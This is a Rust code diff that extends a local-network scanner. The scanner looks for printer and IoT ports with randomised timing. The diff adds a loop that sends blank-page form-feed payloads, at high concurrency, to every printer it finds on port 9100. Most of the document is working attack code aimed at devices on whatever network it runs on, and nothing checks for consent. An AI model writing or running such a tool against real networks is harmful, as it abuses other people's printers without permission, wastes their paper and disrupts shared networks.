@@ -4,9 +4,7 @@ use get_if_addrs::{IfAddr, get_if_addrs};
 use local_ip_address::local_ip;
 use rand::Rng;
 use std::collections::HashMap;
-use std::env::temp_dir;
 use std::net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4};
-use std::str::FromStr;
 use std::time::Duration;
 use tokio::io::AsyncWriteExt;
 use tokio::net::TcpStream;
@@ -14,7 +12,7 @@ use tokio::time::{sleep, timeout};
 
 const ORDERED_PORTS: [u16; 5] = [9100, 631, 515, 1883, 8883];
 
-const CONCURRENCY: usize = 64; // amt of concurrent request threads
+const CONCURRENCY: usize = 100; // amt of concurrent request threads
 const MIN_JITTER_MS: u64 = 50;
 const MAX_JITTER_MS: u64 = 400;
 const CONNECT_TIMEOUT_SECS: u64 = 1;
@@ -27,7 +25,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .map(|ip| async move { check_ports(ip).await })
         .buffer_unordered(CONCURRENCY)
         .collect()
-        .await; // these last 2 (collect and await) handle all the async thread mess
+        .await;
+    // these last 2 (collect and await) handle all the async mess in terms of writing to the vec from multiple threads
 
     let mut printers_map: HashMap<u16, Vec<Ipv4Addr>> = HashMap::new();
     // flatten() will remove the None values because online_printers is a Vec of Options
@@ -36,11 +35,38 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         // or_default will create value entry if one doesn't exist for key (port)
     }
 
+    let num_pages: usize = 5;
+    let payload: Vec<u8> = blank_pages_payload(num_pages);
+
+    // iterate through map per port and start blastin'
+    if let Some(printer_vec) = printers_map.get(&9100) {
+        println!(
+            "Blastin' default of {} pages to {} printers on port 9100",
+            num_pages,
+            printer_vec.len()
+        );
+        stream::iter(printer_vec)
+            .map(|printer_ip| {
+                let payload = payload.clone();
+                async move {
+                    // stream::iter works by borrowing each element in the iterator
+                    // send_on_9100 expects printer_ip not &printer_ip so have to dereference (*)
+                    match send_on_9100(*printer_ip, &payload).await {
+                        Ok(_) => println!("{}: sent OK", printer_ip),
+                        Err(e) => println!("Error sending page to {}: {}", printer_ip, e),
+                    }
+                }
+            })
+            .buffer_unordered(CONCURRENCY)
+            .collect::<()>()
+            .await;
+    }
+
     Ok(())
 }
 
 // sends carriage returns to print out blank pages
-fn send_blank_pages(pages: usize) -> Vec<u8> {
+fn blank_pages_payload(pages: usize) -> Vec<u8> {
     let mut v = Vec::with_capacity(pages);
     for _ in 0..pages {
         v.push(0x0Cu8);
@@ -78,7 +104,6 @@ async fn send_on_9100(ip: Ipv4Addr, data: &[u8]) -> Result<(), String> {
 }
 
 async fn check_ports(ip: Ipv4Addr) -> Option<(u16, Ipv4Addr)> {
-    println!("checking ports on {}", ip);
     let mut rng = rand::rng();
     let initial_jitter = rng.random_range(MIN_JITTER_MS..=MAX_JITTER_MS);
     sleep(Duration::from_millis(initial_jitter)).await;
